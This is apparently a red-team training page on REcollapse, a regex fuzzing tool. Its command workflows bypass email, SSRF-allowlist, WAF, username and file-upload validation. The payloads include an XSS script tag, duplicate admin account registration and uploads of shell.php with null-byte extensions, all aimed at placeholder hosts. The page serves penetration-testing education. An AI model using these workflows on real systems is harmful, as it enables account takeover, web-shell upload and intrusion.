---
layout: training-page
title: "REcollapse — Regex Fuzzing for Validation Bypass — Red Team Academy"
module: "Web Hacking"
tags:
  - recollapse
  - regex-bypass
  - validation-bypass
  - waf-bypass
  - normalization
  - web-hacking
page_key: "web-recollapse"
render_with_liquid: false
---

# REcollapse — Regex Fuzzing for Validation Bypass

REcollapse is a black-box regex fuzzing tool that generates payloads to bypass input validations and discover Unicode normalization quirks in web applications. It works by mutating a legitimate input across seven variation modes (character position fuzzing, Unicode normalization, case folding, byte truncation, regex metacharacter injection) and outputting payloads in URL-encoded, Unicode, raw, or double-encoded formats for use with Burp Intruder, ffuf, or Caido.

Use cases: bypassing email validators, URL allowlists, username filters, file upload restrictions, SSRF protections, and WAF rules that rely on regex matching.

## Install

```
# pip install
pip3 install recollapse

# From source:
git clone https://github.com/0xacb/recollapse
cd recollapse
pip3 install .

# Docker:
docker pull 0xacb/recollapse
```

## Fuzzing Modes

Modes control where and how the input is mutated. Stack multiple modes to generate comprehensive payloads.

```
# Mode reference:
# 1 = starting    → fuzz at the start of input: $input
# 2 = separator   → fuzz before/after each special char: a$_$b$.$c
# 3 = normalization → replace bytes per Unicode normalization table
# 4 = termination → fuzz at the end of input: input$
# 5 = regex meta  → replace regex metacharacters: .^$*+-?()[]{}\|
# 6 = case folding → upper/lower/case-fold variants
# 7 = truncation  → replace bytes per truncation table

# Default: all modes (1,2,3,4,5,6,7)
recollapse input_value

# Targeted: start + termination + separators only
recollapse -m 1,2,4 "user@example.com"

# Normalization only (for Unicode bypass testing):
recollapse -m 3 "admin"
```

## Encoding Modes

```
# Encoding affects output format for injecting into different content types:

# 1 = URL-encoded (default) — use with query params, form bodies
recollapse -e 1 "user@example.com"
# Output: %00user@example.com, %0auser@example.com, ...

# 2 = Unicode escape — use with JSON payloads
recollapse -e 2 "user@example.com"
# Output: \u0000user@example.com, \u000auser@example.com, ...

# 3 = Raw — use with multipart/form-data
recollapse -e 3 "user@example.com"
# Output: raw byte prepended/inserted

# 4 = Double URL-encoded — use against WAFs that decode once
recollapse -e 4 "user@example.com"
# Output: %2500user@example.com, ...
```

## Common Attack Workflows

### Email Validator Bypass

```
# Target: email field that validates format but not uniqueness
# Goal: create a second account for admin@example.com

echo "admin@example.com" | recollapse -e 1 -m 1,2,4 | \
  ffuf -w - -u "https://target.com/register" \
       -X POST -H "Content-Type: application/x-www-form-urlencoded" \
       -d "email=FUZZ&password=Test1234!" \
       -mc 200 -fs [normal_body_size]

# What to look for:
# %0aadmin@example.com  → newline prefix (newline-tolerant validators)
# admin%40example.com   → double-encoded @
# ÅdMiN@example.com     → Unicode case normalization
```

### URL / SSRF Allowlist Bypass

```
# Target: SSRF protection that allowlists "legit.example.com"
# Goal: redirect to internal host while passing the check

recollapse -e 1 -m 1,2,4 -r 10-11 "https://legit.example.com"
# Modes 1+2+4, only testing bytes 0x0A and 0x0B (newlines)
# Output examples:
#   %0ahttps://legit.example.com  → newline before — URL parser may skip
#   https%0a://legit.example.com  → newline in scheme
#   https://legit%0a.example.com  → in hostname

# Pipe to ffuf:
recollapse -e 1 -m 2,4 "https://legit.example.com" | \
  ffuf -w - -u "https://target.com/fetch?url=FUZZ" -mc 200,500
```

### WAF Regex Bypass

```
# Target: WAF blocking <script> via regex
# Goal: find Unicode/encoding variant that bypasses WAF but executes

echo "<script>alert(1)</script>" | recollapse -e 1 -m 3,5,6 | \
  ffuf -w - -u "https://target.com/?q=FUZZ" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -mc 200 -fs [waf_blocked_size]

# Mode 3: normalization variants (e.g. ＜ → <)
# Mode 5: regex metacharacter injection
# Mode 6: case variations (ScRiPt, SCRIPT)
```

### Username / Account Takeover

```
# Target: username field that validates regex but normalizes Unicode before storage
# Goal: register "admin" variant that resolves to same account

recollapse -e 3 -m 3,6 "admin" | \
  while IFS= read -r payload; do
    curl -s -o /dev/null -w "%{http_code} $payload\n" \
      -X POST "https://target.com/register" \
      -d "username=$payload&password=Test1234!"
  done

# Interesting results:
# ȧdmin, Ądmin, ₐdmin → Unicode chars that normalize to 'a'
# ᵃdmin, àdmin → case-folded variants
# admin%00 → null-byte termination (truncates in some validators)
```

### File Upload Extension Bypass

```
# Target: file upload that rejects .php via regex
# Goal: upload file that bypasses extension check but executes

recollapse -e 1 -m 4,3 "shell.php" | \
  while IFS= read -r payload; do
    curl -s -F "file=@shell.php;filename=$payload" \
      "https://target.com/upload" | grep -i "success\|uploaded"
  done

# Test for: shell.php%00.jpg, shell.pHp, shell.php%0a, shell.ṕhp
```

## Advanced Options

```
# Byte range — limit fuzzing to specific byte range:
recollapse -r 0,0x7f "input"   # ASCII range only
recollapse -r 0x80,0xff "input" # High bytes only (Unicode bypass)
recollapse -r 10,11 "input"    # Newline chars only (0x0A, 0x0B)

# Size — number of bytes to insert at once (default: 1):
recollapse -s 2 "input"   # Insert two bytes at each position (more payloads)

# File input:
recollapse -f inputs.txt    # Read inputs from file

# Include alphanumeric in output (excluded by default):
recollapse -an "input"

# Normalization depth (default 3 variants per position):
recollapse -mn 5 "input"

# Print tables for reference:
recollapse -nt    # Normalization table
recollapse -ct    # Case table
recollapse -tt    # Truncation table
recollapse -nt --html > normalization_table.html  # HTML format
```

## Library Usage (Python)

```
from recollapse import Recollapse

# Generate variants programmatically:
rc = Recollapse(modes=Recollapse.DEFAULT_MODES, encoding=Recollapse.ENCODING_RAW)
variants = rc.generate("admin@example.com")

for variant in variants:
    print(variant)

# Custom modes — normalization + case folding only:
rc = Recollapse(modes=[3, 6], encoding=Recollapse.ENCODING_URL)
for v in rc.generate("user@example.com"):
    print(v)
```

## Integration with Burp Suite

```
# Save payloads to file, use as Burp Intruder wordlist:
echo "admin@example.com" | recollapse -e 1 > recollapse_payloads.txt

# In Burp Intruder:
# 1. Mark the email parameter as injection point
# 2. Payload type: Simple list
# 3. Load from file: recollapse_payloads.txt
# 4. Run — filter by different response size/code

# For WAF testing, check for status code differences:
# 200 = bypassed  |  403 = blocked  |  500 = error (potential bypass)
```

## What to Look For

```
# Success indicators when fuzzing validations:
# - Status code changes (200 when 400 was expected)
# - Different response body size
# - Account created / file uploaded / action performed
# - Error messages changing (validation error vs. application error)

# Normalization-based bypasses:
# Input: ℬ → normalized to B (Unicode Mathematical Bold)
# Input: ＠ → normalized to @ (Fullwidth commercial at)
# Input: ／ → normalized to / (Fullwidth solidus)

# High-value test positions:
# Before:  %0a user@example.com   (prepend newline)
# After:   user@example.com %00   (null byte terminate)
# Middle:  user%40example.com     (encoded @)
# Case:    USER@EXAMPLE.COM vs user@example.com (normalization)
```

## Resources

- REcollapse — `github.com/0xacb/recollapse`
- Blog post — `0xacb.com/2022/11/21/recollapse/`
- Normalization table — `0xacb.com/normalization_table`
- Related: [Regex Bypass Techniques](/web/regex-bypass/)
- Related: [Encoding Transformations](/web/encoding-transformations/)
